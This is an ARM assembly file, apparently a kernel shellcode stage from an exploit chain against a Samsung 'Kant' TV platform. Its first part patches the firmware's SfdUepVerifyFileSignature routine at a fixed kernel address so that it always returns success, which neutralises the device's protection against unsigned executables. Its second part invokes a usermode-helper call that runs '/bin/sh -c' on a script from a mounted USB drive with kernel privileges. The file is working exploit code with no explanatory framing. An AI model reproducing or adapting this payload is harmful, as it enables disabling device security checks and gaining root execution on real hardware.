.syntax unified
.arm
.global _start
_start:
    ldr sp, [sp]              @ sp was 0xc0008d00: load the live memcpy r1
    sub sp, sp, #0x400        @ stay inside this task's 8 KiB kernel stack

    @ Kant UEP neutraliser: SfdUepVerifyFileSignature(0xc0211c70)
    @ -> mov r0, #2 ; bx lr ; then flush the 8 patched bytes.
    ldr r0, uep_lit
    ldr r1, uep_w0_lit
    str r1, [r0]
    ldr r1, uep_w1_lit
    str r1, [r0, #4]
    add r1, r0, #8
    ldr r3, [pc, #-48]        @ stage0's coherent word at blob+128 (0xc001bfbc)
    blx r3

    adr r0, path
    str r0, [sp, #16]
    adr r4, argc
    str r4, [sp, #20]
    adr r4, cmd
    str r4, [sp, #24]
    eor r4, r4, r4
    str r4, [sp, #28]
    add r1, sp, #16
    mov r2, #0
    mov r3, #0
    ldr r4, umh_lit
    blx r4
1:  b 1b
umh_lit: .word 0xc00389c4
uep_lit: .word 0xc0211c70
uep_w0_lit: .word 0xe3a00002
uep_w1_lit: .word 0xe12fff1e
path: .asciz "/bin/sh"
argc: .asciz "-c"
cmd:  .asciz "sh</opt/media/USBDriveA2/s"
    .balign 4, 0x41
